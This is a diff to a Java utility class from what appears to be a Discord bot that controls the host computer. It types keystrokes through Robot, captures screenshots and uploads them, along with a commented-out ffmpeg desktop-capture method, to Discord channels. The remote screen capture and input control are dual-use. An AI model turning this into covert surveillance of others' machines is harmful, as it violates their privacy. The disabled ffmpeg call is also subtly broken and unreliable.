@@ -28,8 +28,13 @@ import java.util.function.Consumer;
 
 public class CommandUtils {
 
-    private String PublicIP;
+    public final String OpSystem = System.getProperty("os.name");
+    public final boolean isWindows = System.getProperty("os.name").toLowerCase().contains("win");
+    public final boolean isLinux = System.getProperty("os.name").toLowerCase().replace('u', 'i').contains("ix"); // LAZY LEVEL 9999
+    public final boolean isMac = System.getProperty("os.name").toLowerCase().contains("mac");
+    public final boolean isSolaris = System.getProperty("os.name").toLowerCase().contains("sunos");
 
+    private String PublicIP;
     private static int[] numpad = {
             KeyEvent.VK_NUMPAD0,
             KeyEvent.VK_NUMPAD1,
@@ -43,6 +48,9 @@ public class CommandUtils {
             KeyEvent.VK_NUMPAD9
     };
     private static DateFormat hourFormat = new SimpleDateFormat("hh:mm a");
+
+    public CommandUtils() {
+    }
 
     public static void typeString(Robot robot, String str) {
         Toolkit toolkit = Toolkit.getDefaultToolkit();
@@ -105,6 +113,28 @@ public class CommandUtils {
         BufferedImage img = ImageIO.read(new File("src/main/resources/ss.png"));
         return img;
     }
+/*
+    public static boolean recordVideo(MessageChannel channel) {
+        try {
+            Robot robot = new Robot();
+            ProcessBuilder builder = new ProcessBuilder("ffmpeg -f gdigrab -draw_mouse 0 -i desktop -preset ultrafast -tune zerolatency -crf 0 -pix_fmt yuv420p -movflags +faststart -vframes 1 -q:v 1 screenshot.png -y");
+            builder.start();
+            robot.delay(1000);
+            File recFile = new File("screenshot.png");
+            channel.sendFile(recFile).queue();
+            return true;
+        } catch (Exception e) {
+            e.printStackTrace();
+            System.out.println(System.getProperty("user.dir"));
+            return false;
+        }
+    }
+
+    public static boolean recordVideo(MessageReceivedEvent event) {
+        return recordVideo(event.getChannel());
+    }
+    */
+
 
     public static int getKeyCode(String str) { // JESUS FUCKING CHRIST DISYER
         str = str.toLowerCase();
@@ -215,6 +245,10 @@ public class CommandUtils {
 
     public static void sendEmbed(MessageChannel channel, User user, String command, String title, String description) {
         sendEmbed(channel, user, command, title, description, null);
+    }
+
+    public static void sendEmbed(MessageChannel channel, User user, String command, String title) {
+        sendEmbed(channel, user, command, title, null, null);
     }
 
     public static void sendCommandEmbed(MessageChannel channel, User user, String command, String description) {
